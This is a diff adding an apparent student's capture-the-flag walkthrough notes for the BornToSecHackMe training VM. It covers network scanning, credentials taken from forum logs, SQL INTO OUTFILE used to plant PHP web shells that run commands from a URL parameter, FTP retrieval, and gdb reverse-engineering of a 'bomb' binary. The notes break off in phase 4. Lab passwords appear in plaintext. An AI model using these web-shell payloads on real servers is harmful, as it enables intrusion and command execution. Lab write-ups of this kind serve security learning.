@@ -1,0 +1,1421 @@
+on windows
+ipconfig -> 
+
+Адаптер Ethernet VMware Network Adapter VMnet1:
+
+   DNS-суффикс подключения . . . . . :
+   Локальный IPv6-адрес канала . . . : fe80::b150:c33a:44e:37d0%21
+   IPv4-адрес. . . . . . . . . . . . : 192.168.255.1
+   Маска подсети . . . . . . . . . . : 255.255.255.0
+   Основной шлюз. . . . . . . . . :
+
+Адаптер Ethernet VMware Network Adapter VMnet8:
+
+   DNS-суффикс подключения . . . . . :
+   Локальный IPv6-адрес канала . . . : fe80::df42:3c65:6f6c:ac19%31
+   IPv4-адрес. . . . . . . . . . . . : 192.168.31.1
+   Маска подсети . . . . . . . . . . : 255.255.255.0
+
+
+polina@DESKTOP-87RT6O2:~$ nmap 192.168.255.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-29 13:19 MSK
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+Nmap done: 256 IP addresses (0 hosts up) scanned in 79.06 seconds
+polina@DESKTOP-87RT6O2:~$ nmap 192.168.31.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-29 13:22 MSK
+Nmap scan report for 192.168.31.129
+Host is up (0.72s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+
+Nmap done: 256 IP addresses (1 host up) scanned in 60.71 seconds
+
+
+192.168.31.129
+
+
+
+192.168.31.129:80
+polina@DESKTOP-87RT6O2:~$ curl 192.168.31.129
+<!DOCTYPE html>
+<html>
+<head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>Hack me if you can</title>
+        <meta name='description' content='Simple and clean HTML coming soon / under construction page'/>
+        <meta name='keywords' content='coming soon, html, html5, css3, css, under construction'/>
+        <link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
+        <link href='http://fonts.googleapis.com/css?family=Coustard' rel='stylesheet' type='text/css'>
+
+</head>
+<body>
+        <div id="wrapper">
+                <h1>Hack me</h1>
+                <h2>We're Coming Soon</h2>
+                <p>We're wetting our shirts to launch the website.<br />
+                In the mean time, you can connect with us trought</p>
+                <p><a href="https://fr-fr.facebook.com/42Born2Code"><img src="fb.png" alt="Facebook" /></a> <a href="https://plus.google.com/+42Frborn2code"><img src="+.png" alt="Google +" /></a> <a href="https://twitter.com/42born2code"><img src="twitter.png" alt="Twitter" /></a></p>
+        </div>
+</body>
+</html>
+
+
+
+
+polina@DESKTOP-87RT6O2:~$ dirb http://192.168.31.129
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Dec 29 13:40:53 2022
+URL_BASE: http://192.168.31.129/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.31.129/ ----
++ http://192.168.31.129/cgi-bin/ (CODE:403|SIZE:290)
+==> DIRECTORY: http://192.168.31.129/fonts/
++ http://192.168.31.129/forum (CODE:403|SIZE:287)
++ http://192.168.31.129/index.html (CODE:200|SIZE:1025)
++ http://192.168.31.129/server-status (CODE:403|SIZE:295)
+
+---- Entering directory: http://192.168.31.129/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Thu Dec 29 13:40:57 2022
+DOWNLOADED: 4612 - FOUND: 4
+
+
+
+polina@DESKTOP-87RT6O2:~$ dirb https://192.168.31.129 | grep +
++ https://192.168.31.129/cgi-bin/ (CODE:403|SIZE:291)
+==> DIRECTORY: https://192.168.31.129/phpmyadmin/
++ https://192.168.31.129/server-status (CODE:403|SIZE:296)
++ https://192.168.31.129/forum/backup (CODE:403|SIZE:295)
++ https://192.168.31.129/forum/config (CODE:403|SIZE:295)
++ https://192.168.31.129/forum/index (CODE:200|SIZE:4935)
++ https://192.168.31.129/forum/index.php (CODE:200|SIZE:4935)
+==> DIRECTORY: https://192.168.31.129/forum/modules/
++ https://192.168.31.129/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
++ https://192.168.31.129/phpmyadmin/index.php (CODE:200|SIZE:7540)
++ https://192.168.31.129/phpmyadmin/libraries (CODE:403|SIZE:303)
++ https://192.168.31.129/phpmyadmin/phpinfo.php (CODE:200|SIZE:7540)
++ https://192.168.31.129/phpmyadmin/setup (CODE:401|SIZE:482)
++ https://192.168.31.129/webmail/class (CODE:403|SIZE:296)
++ https://192.168.31.129/webmail/functions (CODE:403|SIZE:300)
++ https://192.168.31.129/webmail/help (CODE:403|SIZE:295)
++ https://192.168.31.129/webmail/include (CODE:403|SIZE:298)
++ https://192.168.31.129/webmail/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/locale (CODE:403|SIZE:297)
+==> DIRECTORY: https://192.168.31.129/webmail/plugins/
+
+==> DIRECTORY: https://192.168.31.129/phpmyadmin/locale/lt/
+==> DIRECTORY: https://192.168.31.129/phpmyadmin/themes/original/
++ https://192.168.31.129/webmail/config/index.php (CODE:302|SIZE:0)
+
++ https://192.168.31.129/webmail/images/index.php (CODE:302|SIZE:0)
+
++ https://192.168.31.129/webmail/plugins/index.php (CODE:302|SIZE:0)
+==> DIRECTORY: https://192.168.31.129/webmail/plugins/test/
++ https://192.168.31.129/webmail/src/index.php (CODE:302|SIZE:0)
+
++ https://192.168.31.129/webmail/themes/index.php (CODE:302|SIZE:0)
+
++ https://192.168.31.129/webmail/plugins/administrator/index.php (CODE:302|SIZE:0)
+
++ https://192.168.31.129/webmail/plugins/calendar/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/plugins/calendar/README (CODE:200|SIZE:887)
++ https://192.168.31.129/webmail/plugins/demo/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/plugins/demo/README (CODE:200|SIZE:837)
++ https://192.168.31.129/webmail/plugins/fortune/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/plugins/fortune/README (CODE:200|SIZE:485)
++ https://192.168.31.129/webmail/plugins/info/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/plugins/info/README (CODE:200|SIZE:1632)
++ https://192.168.31.129/webmail/plugins/test/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/plugins/test/README (CODE:200|SIZE:505)
++ https://192.168.31.129/webmail/plugins/translate/index.php (CODE:302|SIZE:0)
++ https://192.168.31.129/webmail/plugins/translate/README (CODE:200|SIZE:1730)
++ https://192.168.31.129/webmail/themes/css/index.php (CODE:302|SIZE:0)
+
+https://192.168.31.129/phpmyadmin/
+https://192.168.31.129/forum/
+https://192.168.31.129/webmail/
+
+
+error page
+```
+Forbidden
+You don't have permission to access /forum on this server.
+
+Apache/2.2.22 (Ubuntu) Server at 192.168.31.129 Port 80
+```
+
+https://192.168.31.129/forum/
+
+
+Probleme login ? - lmezard, 2015-10-08, 00:10
+
+
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+
+Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
+
+Oct 5 11:33:01 BornToSecHackMe CRON[14942]: pam_unix(cron:session): session opened for user root by (uid=0)
+
+Oct 5 14:54:00 BornToSecHackMe sshd[23804]: Accepted password for admin from 62.210.32.157 port 61495 ssh2
+
+
+LogIn
+lmezard
+!q\]Ej?*5K5cy*AJ
+
+I'm in!
+laurie@borntosec.net
+
+
+
+Username [asc]	Type
+admin			Admin	 	
+lmezard		User	 	 
+qudevide		User	 	 
+thor			User	 	 
+wandre		User	 	 
+zaz			User	 	 
+
+we can email to admin
+
+https://192.168.31.129/phpmyadmin/index.php
+https://192.168.31.129/webmail/src/login.php
+
+
+login-password is the same for email
+doesn't work for phpmyadmin, ssh
+
+
+email
+
+DB Access
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+
+
+phpmyadmin
+
+
+Я сломала виртуалку, поэтому новый ip
+ 192.168.31.134
+
+
+
+All userdata in forum_db/mlf2_userdata is hashed
+
+As we have root priveleges on phpmyadmin we can insert through SQL injection a php backdoor which reads commands from file and executes them
+
+
+Для целей этой демонстрации мы предположим, что корневой веб-каталог Apache по умолчанию ( / var / www / ) используется с общедоступными разрешениями на запись.
+Информацию о веб-сервере, включая корневой каталог, обычно можно найти в файле «phpinfo.php»
+
+templates_c used for compiled templates, but without the actual content, that can be dynamically inserted into them.
+Smarty is a template engine for PHP.
+This is the name of the directory where compiled templates are located.
+By default this is ./templates_c, meaning that Smarty will look for the templates_c/ directory in the same directory as the executing php script.
+This directory must be writeable by the web server
+
+
+insert into backdoor(script) values("<?php echo exec($_GET['cmd'];?>");
+select * into outfile "/var/www/backdoor.php" from backdoor;
+http://localhost/backdoor.php?cmd=uname -a
+
+Now remember, we want to insert our own PHP code so we can run shell commands.
+To do this, we use the INTO OUTFILE feature that MySQL provides.
+Using INTO OUTFILE, it is possible for the output of a query to be redirected into a file on the operating system.
+we’ll use some very basic PHP code that will read an argument from the URL and run a command against the operating system, using it as an input.
+Here is the input that we will give: Harry Potter’ union select “<? system($_REQUEST[‘cmd’]); ?>”,2,3 INTO OUTFILE ‘/var/www/test/execcmd.php’#
+
+SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
+
+
+SELECT '<? system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php' 
+https://192.168.31.134/forum/templates_c/backdoor.php?cmd=pwd
+/var/www/forum/templates_c
+
+url-encoding space: %20
+https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls
+
+https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la
+total 455
+drwxrwxrwx 1 www-data www-data 80 Dec 29 14:46 .
+drwxr-xr-x 1 www-data www-data 60 Oct 8 2015 ..
+-rwxr-xr-x 1 www-data www-data 1 Oct 8 2015 .dummy
+-rwxr-xr-x 1 www-data www-data 211754 Oct 8 2015 11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 3576 Oct 8 2015 2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 23519 Oct 8 2015 40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 1357 Oct 8 2015 427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
+-rwxr-xr-x 1 www-data www-data 30987 Oct 8 2015 560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 13181 Oct 8 2015 5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
+-rwxr-xr-x 1 www-data www-data 18923 Oct 8 2015 749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 64906 Oct 8 2015 8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
+-rwxr-xr-x 1 www-data www-data 12086 Oct 8 2015 ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 6343 Oct 8 2015 b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
+-rw-rw-rw- 1 mysql mysql 31 Dec 29 14:42 backdoor.php -rw-rw-rw- 1 mysql mysql 28 Dec 29 14:46 backdoor2.php
+-rwxr-xr-x 1 www-data www-data 23284 Oct 8 2015 d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 6167 Oct 8 2015 e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 28820 Oct 8 2015 f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
+-rwxr-xr-x 1 www-data www-data 9263 Oct 8 2015 f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
+
+https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20/home
+LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+
+https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la%20/home
+total 0
+drwxrwx--x 9 www-data root 126 Oct 13 2015 . 
+drwxr-xr-x 1 root root 200 Dec 29 2022 .. 
+drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME 
+drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root 
+drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie 
+drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15 2015 laurie@borntosec.net 
+dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard 
+drwxr-x--- 3 thor thor 129 Oct 15 2015 thor 
+drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
+
+https://192.168.31.134/forum/templates_c/backdoor2.php?cmd=ls%20-la%20/home/LOOKATME
+total 1 drwxr-x--- 2 www-data www-data 31 Oct 8 2015 . 
+drwxrwx--x 9 www-data root 126 Oct 13 2015 .. -rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password
+
+https://192.168.31.134/forum/templates_c/backdoor2.php?cmd=cat%20/home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+- doesn't work on ssh
+- inside vm this login:password works
+- and works on ftp
+
+polina@DESKTOP-87RT6O2:~$ ftp
+ftp> open
+(to) 192.168.31.134
+Connected to 192.168.31.134.
+220 Welcome on this server
+Name (192.168.31.134:polina): lmezard
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+500 Illegal PORT command.
+ftp: bind: Address already in use
+ftp> pass
+Passive mode on.
+ftp> ls
+227 Entering Passive Mode (192,168,31,134,57,125).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get README
+local: README remote: README
+227 Entering Passive Mode (192,168,31,134,136,22).
+150 Opening BINARY mode data connection for README (96 bytes).
+226 Transfer complete.
+96 bytes received in 0.00 secs (593.3544 kB/s)
+ftp> get fun
+local: fun remote: fun
+227 Entering Passive Mode (192,168,31,134,23,210).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+226 Transfer complete.
+808960 bytes received in 0.08 secs (9.2939 MB/s)
+
+
+> cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+> file fun
+fun: POSIX tar archive (GNU)
+
+> tar -xvf fun
+ft_fun/
+...
+
+.pcap files
+WireShark -> cannot open
+not real pcap files
+
+
+polina@DESKTOP-87RT6O2:~/ft_fun$cat BQ480.pcap
+        printf("Hahahaha Got you!!!\n");
+
+//file348
+polina@DESKTOP-87RT6O2:~/ft_fun$ file G1QLV.pcap
+G1QLV.pcap: ASCII text
+polina@DESKTOP-87RT6O2:~/ft_fun$ cat G1QLV.pcap
+}void useless() {
+
+//file679
+
+
+sort pcap files by numbers: 
+
+polina@DESKTOP-87RT6O2:~$ cat not_pcap_sort.py
+# ! /usr/bin/env python3
+import os
+import re
+import sys
+
+dict = {}
+
+
+for filename in os.listdir("/home/polina/ft_fun"):
+    with open(os.path.join("/home/polina/ft_fun", filename)) as f:
+        txt = f.read()
+        f.close()
+        nbr_line = re.search(r'//file([0-9]*)', txt)
+        dict[int(nbr_line.group(1))] = txt
+
+for k, v in sorted(dict.items()):
+    print(k, v)
+
+python3 not_pcap_sort.py > pcap.c
+
+char getme1() {
+	return 'I';
+}
+
+
+int main() {
+        printf("M");
+        printf("Y");
+        printf(" ");
+        printf("P");
+        printf("A");
+        printf("S");
+        printf("S");
+        printf("W");
+        printf("O");
+        printf("R");
+        printf("D");
+        printf(" ");
+        printf("I");
+        printf("S");
+        printf(":");
+        printf(" ");
+        printf("%c",getme1());
+        printf("%c",getme2());
+        printf("%c",getme3());
+        printf("%c",getme4());
+        printf("%c",getme5());
+        printf("%c",getme6());
+        printf("%c",getme7());
+        printf("%c",getme8());
+        printf("%c",getme9());
+        printf("%c",getme10());
+        printf("%c",getme11());
+        printf("%c",getme12());
+        printf("\n");
+        printf("Now SHA-256 it and submit");
+}
+
+gcc pcap.c
+polina@DESKTOP-87RT6O2:~$ ./a.out
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
+
+https://emn178.github.io/online-tools/sha256.html
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+
+
+laurie@BornToSecHackMe:~$ ls
+bomb  README
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+P
+
+BOOM!!!
+The bomb has blown up.
+
+
+
+(gdb) disass phase_1
+Dump of assembler code for function phase_1:
+   0x08048b20 <+0>:     push   %ebp
+   0x08048b21 <+1>:     mov    %esp,%ebp
+   0x08048b23 <+3>:     sub    $0x8,%esp
+   0x08048b26 <+6>:     mov    0x8(%ebp),%eax
+   0x08048b29 <+9>:     add    $0xfffffff8,%esp
+   0x08048b2c <+12>:    push   $0x80497c0
+   0x08048b31 <+17>:    push   %eax
+   0x08048b32 <+18>:    call   0x8049030 <strings_not_equal>
+   0x08048b37 <+23>:    add    $0x10,%esp
+   0x08048b3a <+26>:    test   %eax,%eax
+   0x08048b3c <+28>:    je     0x8048b43 <phase_1+35>
+   0x08048b3e <+30>:    call   0x80494fc <explode_bomb>
+   0x08048b43 <+35>:    mov    %ebp,%esp
+   0x08048b45 <+37>:    pop    %ebp
+   0x08048b46 <+38>:    ret
+End of assembler dump.
+(gdb) x /s 0x80497c0
+0x80497c0:       "Public speaking is very easy."
+
+(gdb) disass phase_2
+Dump of assembler code for function phase_2:
+   0x08048b48 <+0>:     push   %ebp
+   0x08048b49 <+1>:     mov    %esp,%ebp
+   0x08048b4b <+3>:     sub    $0x20,%esp
+   0x08048b4e <+6>:     push   %esi
+   0x08048b4f <+7>:     push   %ebx
+   0x08048b50 <+8>:     mov    0x8(%ebp),%edx
+   0x08048b53 <+11>:    add    $0xfffffff8,%esp
+   0x08048b56 <+14>:    lea    -0x18(%ebp),%eax
+   0x08048b59 <+17>:    push   %eax
+   0x08048b5a <+18>:    push   %edx
+   0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
+   0x08048b60 <+24>:    add    $0x10,%esp
+   0x08048b63 <+27>:    cmpl   $0x1,-0x18(%ebp)			six_numbers[0] >= 1
+   0x08048b67 <+31>:    je     0x8048b6e <phase_2+38>
+   0x08048b69 <+33>:    call   0x80494fc <explode_bomb>
+   0x08048b6e <+38>:    mov    $0x1,%ebx
+   0x08048b73 <+43>:    lea    -0x18(%ebp),%esi
+   0x08048b76 <+46>:    lea    0x1(%ebx),%eax
+   0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax 	six_numbers[i - 1] * (i + 1) 	
+   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)		six_numbers[i] != six_numbers[i - 1] * (i + 1) 
+   0x08048b81 <+57>:    je     0x8048b88 <phase_2+64>
+   0x08048b83 <+59>:    call   0x80494fc <explode_bomb>
+   0x08048b88 <+64>:    inc    %ebx
+   0x08048b89 <+65>:    cmp    $0x5,%ebx
+   0x08048b8c <+68>:    jle    0x8048b76 <phase_2+46>
+   0x08048b8e <+70>:    lea    -0x28(%ebp),%esp
+   0x08048b91 <+73>:    pop    %ebx
+   0x08048b92 <+74>:    pop    %esi
+   0x08048b93 <+75>:    mov    %ebp,%esp
+   0x08048b95 <+77>:    pop    %ebp
+   0x08048b96 <+78>:    ret
+End of assembler dump.
+
+i = 1
+do {
+	if (six_numbers[i] == six_numbers[i - 1] * (i + 1))
+		i++
+	else
+		fail
+} while (i <= 5)
+
+i: six_numbers
+0: 1				| 
+1: 1 * (1 + 1) = 2	|
+2: 2 * (2 + 1) = 6	| 
+3: 6 * (3 + 1) = 24	|
+4: 24 * (4 + 1) = 120	|
+5: 120 * (5 + 1) = 720	|
+
+1 2 6 24 120 720
+
+
+
+(gdb) disass phase_3
+Dump of assembler code for function phase_3:
+   0x08048b98 <+0>:     push   %ebp
+   0x08048b99 <+1>:     mov    %esp,%ebp
+   0x08048b9b <+3>:     sub    $0x14,%esp
+   0x08048b9e <+6>:     push   %ebx
+   0x08048b9f <+7>:     mov    0x8(%ebp),%edx
+   0x08048ba2 <+10>:    add    $0xfffffff4,%esp
+   0x08048ba5 <+13>:    lea    -0x4(%ebp),%eax
+   0x08048ba8 <+16>:    push   %eax
+   0x08048ba9 <+17>:    lea    -0x5(%ebp),%eax
+   0x08048bac <+20>:    push   %eax
+   0x08048bad <+21>:    lea    -0xc(%ebp),%eax
+   0x08048bb0 <+24>:    push   %eax
+   0x08048bb1 <+25>:    push   $0x80497de					// "%d %c %d"
+   0x08048bb6 <+30>:    push   %edx
+   0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>
+   0x08048bbc <+36>:    add    $0x20,%esp
+   0x08048bbf <+39>:    cmp    $0x2,%eax					// 2
+   0x08048bc2 <+42>:    jg     0x8048bc9 <phase_3+49>
+   0x08048bc4 <+44>:    call   0x80494fc <explode_bomb>
+   0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)				// 7			
+   0x08048bcd <+53>:    ja     0x8048c88 <phase_3+240>
+   0x08048bd3 <+59>:    mov    -0xc(%ebp),%eax
+   0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)
+   0x08048bdd <+69>:    lea    0x0(%esi),%esi
+   0x08048be0 <+72>:    mov    $0x71,%bl					// q			
+   0x08048be2 <+74>:    cmpl   $0x309,-0x4(%ebp)			// 777
+   0x08048be9 <+81>:    je     0x8048c8f <phase_3+247>
+   0x08048bef <+87>:    call   0x80494fc <explode_bomb>
+   0x08048bf4 <+92>:    jmp    0x8048c8f <phase_3+247>
+   0x08048bf9 <+97>:    lea    0x0(%esi,%eiz,1),%esi
+   0x08048c00 <+104>:   mov    $0x62,%bl					// b
+   0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)				// 214
+   0x08048c09 <+113>:   je     0x8048c8f <phase_3+247>
+   0x08048c0f <+119>:   call   0x80494fc <explode_bomb>
+   0x08048c14 <+124>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c16 <+126>:   mov    $0x62,%bl					// b
+   0x08048c18 <+128>:   cmpl   $0x2f3,-0x4(%ebp)			// 755
+   0x08048c1f <+135>:   je     0x8048c8f <phase_3+247>
+   0x08048c21 <+137>:   call   0x80494fc <explode_bomb>
+   0x08048c26 <+142>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c28 <+144>:   mov    $0x6b,%bl					// k					
+   0x08048c2a <+146>:   cmpl   $0xfb,-0x4(%ebp)				// 251
+   0x08048c31 <+153>:   je     0x8048c8f <phase_3+247>
+   0x08048c33 <+155>:   call   0x80494fc <explode_bomb>
+   0x08048c38 <+160>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c3a <+162>:   lea    0x0(%esi),%esi
+   0x08048c40 <+168>:   mov    $0x6f,%bl					// o
+   0x08048c42 <+170>:   cmpl   $0xa0,-0x4(%ebp)				// 160
+   0x08048c49 <+177>:   je     0x8048c8f <phase_3+247>
+   0x08048c4b <+179>:   call   0x80494fc <explode_bomb>
+   0x08048c50 <+184>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c52 <+186>:   mov    $0x74,%bl					// t
+   0x08048c54 <+188>:   cmpl   $0x1ca,-0x4(%ebp)			// 458
+   0x08048c5b <+195>:   je     0x8048c8f <phase_3+247>
+   0x08048c5d <+197>:   call   0x80494fc <explode_bomb>
+   0x08048c62 <+202>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c64 <+204>:   mov    $0x76,%bl					// v
+   0x08048c66 <+206>:   cmpl   $0x30c,-0x4(%ebp)			// 780
+   0x08048c6d <+213>:   je     0x8048c8f <phase_3+247>
+   0x08048c6f <+215>:   call   0x80494fc <explode_bomb>
+   0x08048c74 <+220>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c76 <+222>:   mov    $0x62,%bl					// b
+   0x08048c78 <+224>:   cmpl   $0x20c,-0x4(%ebp)			// 524
+   0x08048c7f <+231>:   je     0x8048c8f <phase_3+247>
+   0x08048c81 <+233>:   call   0x80494fc <explode_bomb>
+   0x08048c86 <+238>:   jmp    0x8048c8f <phase_3+247>
+   0x08048c88 <+240>:   mov    $0x78,%bl					// x
+   0x08048c8a <+242>:   call   0x80494fc <explode_bomb>
+   0x08048c8f <+247>:   cmp    -0x5(%ebp),%bl
+   0x08048c92 <+250>:   je     0x8048c99 <phase_3+257>
+   0x08048c94 <+252>:   call   0x80494fc <explode_bomb>
+   0x08048c99 <+257>:   mov    -0x18(%ebp),%ebx
+   0x08048c9c <+260>:   mov    %ebp,%esp
+   0x08048c9e <+262>:   pop    %ebp
+   0x08048c9f <+263>:   ret
+End of assembler dump
+
+
+switch(first) {
+case 0:
+    c = 'q';
+    if (third != 777)
+        fail
+case 1:
+    c = 'b';
+    if (third != 214)
+        fail
+case 2:
+    c = 'b';
+    if (third != 755)
+        fail
+case 3:
+    c = 'k';
+    if (third != 251)
+        fail
+case 4:
+    c = 'o';
+    if (third != 160)
+        fail
+case 5:
+    c = 't';
+    if (third != 458)
+        fail
+case 6:
+    c = 'v';
+    if (third != 780)
+        fail
+case 7:
+    c = 'b';
+    if (third != 524)
+    	fail
+default:
+    c = 'x';
+    fail
+}
+if (c != second)
+    fail
+
+hint for this is b so we have 3 possibilities:
+1 b 214
+2 b 755
+7 b 524
+
+(gdb) disass phase_4
+Dump of assembler code for function phase_4:
+   0x08048ce0 <+0>:     push   %ebp
+   0x08048ce1 <+1>:     mov    %esp,%ebp
+   0x08048ce3 <+3>:     sub    $0x18,%esp
+   0x08048ce6 <+6>:     mov    0x8(%ebp),%edx
+   0x08048ce9 <+9>:     add    $0xfffffffc,%esp			// 4294967292
+   0x08048cec <+12>:    lea    -0x4(%ebp),%eax
+   0x08048cef <+15>:    push   %eax
+   0x08048cf0 <+16>:    push   $0x8049808				// "%d"
+   0x08048cf5 <+21>:    push   %edx
+   0x08048cf6 <+22>:    call   0x8048860 <sscanf@plt>
+   0x08048cfb <+27>:    add    $0x10,%esp				// 0x10 = 16
+   0x08048cfe <+30>:    cmp    $0x1,%eax
+   0x08048d01 <+33>:    jne    0x8048d09 <phase_4+41>
+   0x08048d03 <+35>:    cmpl   $0x0,-0x4(%ebp)
+   0x08048d07 <+39>:    jg     0x8048d0e <phase_4+46>
+   0x08048d09 <+41>:    call   0x80494fc <explode_bomb>
+   0x08048d0e <+46>:    add    $0xfffffff4,%esp			// 4294967284
+   0x08048d11 <+49>:    mov    -0x4(%ebp),%eax
+   0x08048d14 <+52>:    push   %eax
+   0x08048d15 <+53>:    call   0x8048ca0 <func4>
+   0x08048d1a <+58>:    add    $0x10,%esp
+   0x08048d1d <+61>:    cmp    $0x37,%eax				// 55
+   0x08048d20 <+64>:    je     0x8048d27 <phase_4+71>
+   0x08048d22 <+66>:    call   0x80494fc <explode_bomb>
+   0x08048d27 <+71>:    mov    %ebp,%esp
+   0x08048d29 <+73>:    pop    %ebp
+   0x08048d2a <+74>:    ret
+End of assembler dump.
+(gdb) disass func4
+Dump of assembler code for function func4:
+   0x08048ca0 <+0>:     push   %ebp
+   0x08048ca1 <+1>:     mov    %esp,%ebp
+   0x08048ca3 <+3>:     sub    $0x10,%esp
+   0x08048ca6 <+6>:     push   %esi
+   0x08048ca7 <+7>:     push   %ebx
+   0x08048ca8 <+8>:     mov    0x8(%ebp),%ebx
+   0x08048cab <+11>:    cmp    $0x1,%ebx
+   0x08048cae <+14>:    jle    0x8048cd0 <func4+48>
+   0x08048cb0 <+16>:    add    $0xfffffff4,%esp
+   0x08048cb3 <+19>:    lea    -0x1(%ebx),%eax
+   0x08048cb6 <+22>:    push   %eax
+   0x08048cb7 <+23>:    call   0x8048ca0 <func4>
+   0x08048cbc <+28>:    mov    %eax,%esi
+   0x08048cbe <+30>:    add    $0xfffffff4,%esp
+   0x08048cc1 <+33>:    lea    -0x2(%ebx),%eax
+   0x08048cc4 <+36>:    push   %eax
+   0x08048cc5 <+37>:    call   0x8048ca0 <func4>
+   0x08048cca <+42>:    add    %esi,%eax
+   0x08048ccc <+44>:    jmp    0x8048cd5 <func4+53>
+   0x08048cce <+46>:    mov    %esi,%esi
+   0x08048cd0 <+48>:    mov    $0x1,%eax
+   0x08048cd5 <+53>:    lea    -0x18(%ebp),%esp
+   0x08048cd8 <+56>:    pop    %ebx
+   0x08048cd9 <+57>:    pop    %esi
+   0x08048cda <+58>:    mov    %ebp,%esp
+   0x08048cdc <+60>:    pop    %ebp
+   0x08048cdd <+61>:    ret
+End of assembler dump.
+
+
+int func4(int nbr) {
+    if (nbr <= 1)
+        return 1;
